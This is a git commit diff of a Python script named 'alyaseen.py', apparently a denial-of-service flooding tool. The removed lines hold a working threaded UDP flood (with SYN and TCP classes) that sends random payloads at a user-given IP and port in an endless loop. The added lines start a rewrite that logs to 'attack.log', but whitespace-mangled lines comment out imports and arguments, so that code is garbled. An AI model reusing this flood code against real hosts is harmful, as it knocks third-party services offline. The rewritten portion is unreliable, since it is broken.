0d346809fe057ef972caa6ee0071c3c9e0974967
Zan-0xy <ahmadsan272@gmail.com>
2025-10-09 21:55:37 +0700

    Update alyaseen.py

--- alyaseen.py
+++ alyaseen.py
@@ -1,31 +1,41 @@
-#!usr/bin/python
-# _*_ coding: utf-8 _*_
-import os
-import socket
-import sys
-import time
-import threading
-import string
-import random
- 
-# Color
-class bcolors:
-    Z = '\033[97m'
-    H = '\033[95m'
-    A = '\033[94m'
-    N = '\033[96m'
-    WARNING = '\033[93m'
-    A = '\033[92m'
-    H = '\033[31m'
-    M = '\033[32m'
-    A = '\033[33m'
-    D = '\033[91m'
-    RESET = '\033[0m'
-    g = '\033[1m'
-    g = '\033[4m'
-    
-os.system('clear')
-print("""      
+# -*- coding: utf-8 -*-
+#! /usr/bin/python3,11                                                                                                                   import os
+import requests
+import datetime
+import asyncio
+import validators
+from urllib.parse import urlparse
+from sys import stdout
+from colorama import Fore, Style, init
+import logging                                                                                                                             
+# Inisialisasi Colorama dan Logging                                                                                                        init(autoreset=True)
+                                                                                                                                           # Pengaturan Logging yang benar
+logging.basicConfig(
+    filename='attack.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',  # Perbaiki dari levellevel menjadi levelname                                          datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+# Fungsi untuk Logging Informasi Serangan
+def log_attack_status(message, level='info', print_to_terminal=True):
+    if level == 'info':
+        logging.info(message)
+        if print_to_terminal:
+            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
+    elif level == 'error':
+        logging.error(message)
+        if print_to_terminal:
+            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
+    elif level == 'warning':
+        logging.warning(message)
+        if print_to_terminal:
+            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
+
+
+# Fungsi untuk Menampilkan Header BASE dengan Warna
+def display_header():
+    header_lines = [
+
             
              ║█ ║
              ║█ ║
@@ -41,79 +51,5 @@ print("""
 ║████████████████ ║
  ║██████████████ ║
  ╚═══════════════╝
-""")           
-if len(sys.argv) < 4:
-    sys.exit("\033[96mUsage: python "+sys.argv[0]+" <ip> <port> <size>\033[0m")
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-packets = int(sys.argv[3])
-class syn(threading.Thread):
-    def __init__(self, ip, port, packets):
-        time.sleep(3),
-        self.ip = ip
-        self.port = port
-        self.packets = packets
-        self.syn = socket.socket()
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                self.syn.connect((self.ip, self.port))
-            except:
-                pass
 
-class tcp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                socket.connect(self.ip, self.port)
-                socket.setblocking(0)
-                socket.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
-
-class udp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                if self.port == 0:
-                    self.port = random.randrange(1, 65535)
-                self.udp.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
-
-while True:
-    try:
-        if size > 65507:
-            sys.exit("Invalid Number Of Packets!")
-        u = udp(ip,port,size,packets)
-        u.start()
-        print("\033[33m[\033[1m+\033[33m] \033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[96m-->  \033[95m" +ip+ " \033[0m" )
-        time.sleep(1),
-        print("\033[33m[\033[1m+\033[33m] \033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[31m-->  \033[94m" +ip+ " \033[0m" )
-        time.sleep(1),
-        print("\033[33m[\033[1m+\033[33m] \033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[32m-->  \033[93m" +ip+ " \033[0m" )
-    except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-    except socket.error as e:
-        print ("Socket Couldn't Connect")
-        sys.exit()
